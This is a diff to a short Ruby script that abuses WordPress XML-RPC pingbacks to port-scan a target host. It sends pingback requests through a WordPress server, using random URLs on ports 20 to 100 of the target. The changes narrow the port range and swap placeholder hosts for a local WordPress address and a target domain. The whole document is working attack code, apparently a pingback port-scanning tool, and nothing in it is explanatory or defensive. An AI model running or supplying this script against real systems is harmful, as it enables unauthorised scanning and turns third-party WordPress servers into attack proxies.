@@ -13,7 +13,7 @@ def generate_pingback_xml (target, valid_blog_post)
 end
 
 def generate_requests(hydra, xml_rpc, valid_blog_post, target)
-  (1..100).each do |i|
+  (20..100).each do |i|
     random = (0...8).map{65.+(rand(26)).chr}.join
     url = "#{target}:#{i}/#{random}/"
     xml = generate_pingback_xml(url, valid_blog_post)
@@ -30,8 +30,8 @@ def generate_requests(hydra, xml_rpc, valid_blog_post, target)
 end
 
 hydra = Typhoeus::Hydra.new(:max_concurrency => 10)
-xml_rpc = "http://portscanner/xmlrpc.php"
-valid_blog_post = "http://portscanner/blogpost"
-target = "http://www.firefart.net"
+xml_rpc = "http://192.168.1.6/wordpress/xmlrpc.php"
+valid_blog_post = "http://192.168.1.6/wordpress/2012/09/12/hello-world/"
+target = "http://www.letmeoutofyour.net"
 generate_requests(hydra, xml_rpc, valid_blog_post, target)
 hydra.run
